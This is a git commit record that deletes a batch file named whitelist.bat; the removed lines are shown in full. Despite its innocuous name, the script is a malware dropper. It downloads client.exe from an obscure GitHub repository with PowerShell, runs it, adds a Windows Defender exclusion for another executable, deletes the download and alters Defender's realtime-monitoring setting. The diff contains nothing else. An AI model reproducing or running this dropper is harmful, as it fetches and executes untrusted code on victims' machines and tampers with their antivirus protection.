8ee8a24646d9700253404eac3f683e00d4b237a6
BlaBlak3 <93101797+BlaBlak3@users.noreply.github.com>
2021-11-04 16:11:54 -0400

    Delete whitelist.bat

--- whitelist.bat
+++
@@ -1,9 +0,0 @@
-@echo off
-cd C:\ProgramData
-powershell -Command "Invoke-WebRequest https://github.com/BlaBlak3/oouikyhjnjhsshn/blob/main/client.exe -Outfile client.exe"
-start C:\ProgramData\client.exe
-powershell.exe -Command Add-MpPreference -ExclusionPath "C:\Windows\system32\Runner\Start.exe"
-timeout 2 > NULL
-del C:\ProgramData\client.exe
-powershell.exe -command "Set-MpPreference -DisableRealtimeMonitoring $false"
-exit
